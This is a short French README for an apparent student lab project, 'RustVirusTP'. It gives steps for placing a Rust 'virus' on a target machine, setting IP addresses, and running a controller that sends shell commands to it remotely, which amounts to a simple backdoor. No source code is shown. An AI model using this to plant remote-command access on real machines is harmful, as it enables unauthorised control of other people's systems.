# RustVirusTP

# Instalation
Pour mettre en place ce projet, vous devez déposer le fichier virus.rs sur la machine à infecter. Il est important de récupérer l'ip de cette machine et de la préciser dans le fichier, sur la ligne:
match TcpStream::connect("Mettre ip ici")
Puis, placez le fichier virusControl.rs sur votre machine et mettez l'ip de la machine ciblé dans:
let listener = TcpListener::bind("Mettre ip ici").unwrap();

#Execution
Afin d'executer le code, sur la machine locale, executer la commande:
rustc virusControl.rs
Dans le dossier contenant le code source du serveur, puis executez:
./virusControl

Puis, faite de même sur la machine à infecter:
rustc virus.rs
./virus

Si tout c'est bien passé, les deux consoles vous auront confirmé la connection, et vous pourrez rentrer du texte dans la console du serveur (virusControl). Seuls les commandes simple ont été testés, tel que ls -l. Pour quiter le serveur, rentrez "quit".